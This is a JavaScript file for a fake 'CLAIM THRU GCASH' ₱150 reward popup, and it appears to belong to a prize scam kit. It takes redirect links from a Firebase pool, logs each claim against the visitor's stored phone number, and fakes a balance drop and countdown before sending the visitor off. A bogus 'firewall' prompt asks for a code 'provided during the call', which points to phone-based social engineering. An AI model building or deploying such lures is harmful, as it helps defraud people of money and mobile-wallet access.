/**
 * popup_share.js
 * BASE SA popup.js NG MAIN.HTML
 */

let claimStateShare = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

let cachedFirewallStatusShare = false;
let currentVerificationCodeShare = null;
let verificationAttemptsShare = 0;

// ========== FIREWALL VERIFICATION ==========
async function getFirewallStatusShare() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        return false;
    }
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        if (data === null) {
            await db.ref('admin/globalFirewall').set({
                active: false,
                activatedBy: "SYSTEM",
                timestamp: Date.now()
            });
            return false;
        }
        return data.active === true;
    } catch(e) { 
        return false;
    }
}

function showFirewallPopupShare() {
    const popup = document.getElementById('firewallPopup');
    if (!popup) return;
    
    const content = document.getElementById('firewallPopupContent');
    if (content) {
        content.innerHTML = `
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected, a quick verification call is required.</p>
                <p>Enter the 4-digit code provided during the call.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCodeShare" class="verification-input" placeholder="1234" maxlength="4">
                <button id="verifyCodeBtnShare" class="verify-btn">VERIFY NOW</button>
            </div>
            <div id="firewallErrorMsgShare" class="firewall-error" style="display: none;"></div>
        `;
    }
    
    currentVerificationCodeShare = Math.floor(1000 + Math.random() * 9000).toString();
    verificationAttemptsShare = 0;
    
    popup.style.display = 'flex';
    
    const verifyBtn = document.getElementById('verifyCodeBtnShare');
    if (verifyBtn) {
        verifyBtn.onclick = verifyFirewallCodeShare;
    }
}

window.verifyFirewallCodeShare = async function() {
    const codeInput = document.getElementById('verificationCodeShare');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsgShare');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Enter 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    verificationAttemptsShare++;
    const isValid = (code === currentVerificationCodeShare);
    
    if (isValid) {
        hideFirewallPopupShare();
        alert("Verification successful. Page will refresh.");
        setTimeout(() => window.location.reload(), 500);
    } else {
        let errorMsg = "Invalid code. Try again.";
        if (verificationAttemptsShare >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            setTimeout(() => window.location.reload(), 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

function hideFirewallPopupShare() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

// ========== GET LINK FROM FIREBASE ==========
async function getLatestPayoutLinkShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            return { url: linkData.url, key: key };
        }
        return null;
    } catch (error) {
        return null;
    }
}

// ========== SHOW CLAIM POPUP ==========
async function showClaimPopupShare(amount) {
    const firewallActive = await getFirewallStatusShare();
    
    if (firewallActive) {
        showFirewallPopupShare();
        return;
    }
    
    claimStateShare.currentAmount = amount;
    claimStateShare.isProcessing = false;
    claimStateShare.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount;
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopupShare() {
    const p = document.getElementById('claimPopup');
    if (p) p.style.display = 'none';
}

function showPendingStatusShare() {
    const pa = document.getElementById('pendingStatusArea');
    if (pa) pa.style.display = 'block';
}

function hidePendingStatusShare() {
    const pa = document.getElementById('pendingStatusArea');
    if (pa) pa.style.display = 'none';
}

// ========== BALANCE DECREMENT ==========
function startSmoothDecrementShare(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = originalAmount;
    const steps = originalAmount;
    const intervalTime = 2000 / steps;
    
    claimStateShare.balanceDecrementInterval = setInterval(() => {
        current = current - 1;
        if (current >= 0) balanceText.innerText = "₱" + current + ".00";
        if (current <= 0) {
            clearInterval(claimStateShare.balanceDecrementInterval);
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

// ========== COUNTDOWN ==========
function startVisibleCountdownShare(originalAmount) {
    let remaining = claimStateShare.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    
    if (!timerSpan) return;
    
    claimStateShare.countdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        if (remaining <= 0) {
            clearInterval(claimStateShare.countdownInterval);
            const balanceText = document.getElementById('balanceText');
            if (balanceText) balanceText.innerText = "₱" + originalAmount + ".00";
            if (pendingArea) pendingArea.style.display = 'none';
            claimStateShare.isProcessing = false;
        }
    }, 1000);
}

// ========== REDIRECT ==========
function startImaginaryTimerShare(redirectUrl) {
    setTimeout(() => {
        window.location.href = redirectUrl;
    }, 2000);
}

// ========== CLAIM ACTION ==========
async function onClaimActionShare() {
    if (claimStateShare.isProcessing) return;
    
    claimStateShare.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimStateShare.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (claimBtn) {
        claimBtn.disabled = true;
        claimBtn.innerHTML = 'PROCESSING...';
    }
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        try {
            const linkData = await getLatestPayoutLinkShare();
            
            if (linkData && linkData.url) {
                let redirectUrl = linkData.url;
                
                await db.ref('links/' + linkData.key).update({ 
                    status: 'claimed', 
                    user: userPhone, 
                    amount: amount, 
                    claimedAt: Date.now() 
                });
                
                hideClaimPopupShare();
                showPendingStatusShare();
                
                const balanceText = document.getElementById('balanceText');
                if (balanceText) startSmoothDecrementShare(amount);
                
                startVisibleCountdownShare(amount);
                startImaginaryTimerShare(redirectUrl);
                
            } else {
                if (claimBtn) {
                    claimBtn.innerHTML = 'NO REWARDS';
                    setTimeout(() => {
                        claimBtn.innerHTML = 'CLAIM THRU GCASH';
                        claimBtn.disabled = false;
                        claimStateShare.isProcessing = false;
                    }, 3000);
                }
                alert("No payout link available.");
            }
        } catch(err) {
            if (claimBtn) {
                claimBtn.innerHTML = 'ERROR';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimStateShare.isProcessing = false;
                }, 3000);
            }
            alert("System error. Please try again.");
        }
    }
}

// ========== HANDLE CLAIM THRU GCASH ==========
async function handleClaimThruGCash() {
    console.log("CLAIM THRU GCASH clicked");
    await showClaimPopupShare(150);
}

// ========== INITIALIZE ==========
function initClaimButton() {
    const claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        claimBtn.onclick = function(e) {
            e.preventDefault();
            handleClaimThruGCash();
        };
        console.log("CLAIM THRU GCASH button ready");
    }
}

document.addEventListener('DOMContentLoaded', function() {
    console.log("Popup_share.js loaded");
    initClaimButton();
});

// Expose
window.handleClaimThruGCash = handleClaimThruGCash;
window.onClaimActionShare = onClaimActionShare;
window.showClaimPopupShare = showClaimPopupShare;
